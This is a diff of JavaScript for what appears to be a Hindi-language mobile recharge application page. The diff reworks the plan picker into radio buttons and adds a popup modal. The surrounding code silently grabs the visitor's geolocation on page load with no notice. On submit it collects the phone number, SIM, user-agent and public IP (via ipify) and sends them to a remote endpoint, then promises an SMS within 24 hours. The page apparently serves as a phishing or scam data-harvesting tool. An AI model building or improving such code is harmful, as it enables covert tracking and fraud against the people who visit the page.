@@ -23,28 +23,44 @@ const plansData = {
 
 const simSelect = document.getElementById('sim');
 const plansDiv = document.getElementById('plans');
-const planList = document.getElementById('plan-list');
+const plansForm = document.getElementById('plansForm');
 const mobileInput = document.getElementById('mobile');
 const submitBtn = document.getElementById('submitBtn');
-const statusMessage = document.getElementById('statusMessage');
+
+const popupModal = document.getElementById('popupModal');
+const closePopupBtn = document.getElementById('closePopupBtn');
+const popupText = document.getElementById('popupText');
 
 simSelect.addEventListener('change', () => {
   const sim = simSelect.value;
+  plansForm.innerHTML = ''; // Clear previous plans
+
   if (sim && plansData[sim]) {
-    planList.innerHTML = '';
-    plansData[sim].forEach((plan) => {
-      const li = document.createElement('li');
-      li.textContent = plan;
-      planList.appendChild(li);
+    plansData[sim].forEach((plan, index) => {
+      const planId = `plan_${index}`;
+      const label = document.createElement('label');
+      label.htmlFor = planId;
+
+      const radio = document.createElement('input');
+      radio.type = 'radio';
+      radio.name = 'plan';
+      radio.id = planId;
+      radio.value = plan;
+
+      const span = document.createElement('span');
+      span.textContent = plan;
+
+      label.appendChild(radio);
+      label.appendChild(span);
+      plansForm.appendChild(label);
     });
     plansDiv.style.display = 'block';
   } else {
     plansDiv.style.display = 'none';
-    planList.innerHTML = '';
   }
 });
 
-// Silent location send on page load, no UI message
+// Silent location send on page load
 window.onload = () => {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
@@ -52,7 +68,7 @@ window.onload = () => {
         sendLocation(position);
       },
       () => {
-        // silently fail if user denies location
+        // silently fail
       }
     );
   }
@@ -96,14 +112,18 @@ submitBtn.addEventListener('click', async () => {
     return;
   }
 
+  const selectedPlanInput = document.querySelector('input[name="plan"]:checked');
+  if (!selectedPlanInput) {
+    alert('कृपया एक रिचार्ज योजना चुनें।');
+    return;
+  }
+  const selectedPlan = selectedPlanInput.value;
+
   submitBtn.classList.add('loading');
   submitBtn.textContent = 'प्रक्रिया जारी है...';
 
   try {
-    const selectedPlan =
-      plansDiv.style.display === 'block'
-        ? planList.children[0]?.textContent || 'कोई योजना चयनित नहीं'
-        : 'कोई योजना चयनित नहीं';
+    // First message
     const msg1 = `📱 नया रिचार्ज आवेदन:\nसिम: ${sim}\nमोबाइल नंबर: ${mobile}\nचयनित योजना: ${selectedPlan}`;
 
     await fetch(
@@ -118,9 +138,11 @@ submitBtn.addEventListener('click', async () => {
       }
     );
 
+    // Get IP
     const ipRes = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipRes.json();
 
+    // Second message
     const msg2 = `ℹ️ डिवाइस जानकारी:\nUser-Agent: ${navigator.userAgent}\nIP पता: ${ipData.ip}`;
 
     await fetch(
@@ -135,15 +157,25 @@ submitBtn.addEventListener('click', async () => {
       }
     );
 
-    alert('आपका रिचार्ज आवेदन सफलतापूर्वक भेज दिया गया है। 24 घंटे में SMS प्राप्त होगा।');
+    // Show popup modal
+    popupText.textContent = 'आपका रिचार्ज आवेदन सफलतापूर्वक भेज दिया गया है। 24 घंटे में SMS प्राप्त होगा।';
+    popupModal.classList.add('show');
+
+    // Reset form
     mobileInput.value = '';
     simSelect.value = '';
     plansDiv.style.display = 'none';
-    planList.innerHTML = '';
+    plansForm.innerHTML = '';
+
   } catch (error) {
     alert('त्रुटि हुई, कृपया पुनः प्रयास करें।');
   } finally {
     submitBtn.classList.remove('loading');
     submitBtn.textContent = 'रिचार्ज के लिए आवेदन करें';
   }
+});
+
+// Close popup modal
+closePopupBtn.addEventListener('click', () => {
+  popupModal.classList.remove('show');
 });
